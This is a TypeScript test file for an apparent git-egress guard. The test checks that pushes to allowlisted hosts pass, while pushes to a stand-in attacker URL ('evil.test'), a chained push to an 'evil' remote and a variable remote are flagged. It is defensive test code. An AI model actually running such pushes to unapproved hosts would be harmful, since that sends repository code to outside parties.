import { execFileSync } from "node:child_process";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { expect, it } from "vitest";
import { extractArgumentFields } from "./arguments.js";
import { checkGitPush } from "./git-egress.js";

it("resolves literal and configured push destinations without contacting a remote", async () => {
  const cwd = await mkdtemp(join(tmpdir(), "palizade-git-"));
  const allowlist = { hosts: ["github.com"], emails: [], destinations: [] };
  const check = (command: string) => checkGitPush("shell", extractArgumentFields({ command }), cwd, allowlist);
  try {
    execFileSync("git", ["init", "--quiet"], { cwd });
    execFileSync("git", ["remote", "add", "origin", "git@github.com:example/repository.git"], { cwd });
    expect(check("git push origin main")).toEqual({ unapproved: false, destinations: ["host:github.com"] });
    expect(check("git push https://evil.test/repo.git main").unapproved).toBe(true);
    expect(check("git push origin main && git push evil main").unapproved).toBe(true);
    expect(check("git push $REMOTE main").unapproved).toBe(true);
    expect(check("npm test").unapproved).toBe(false);
  } finally { await rm(cwd, { recursive: true, force: true }); }
});
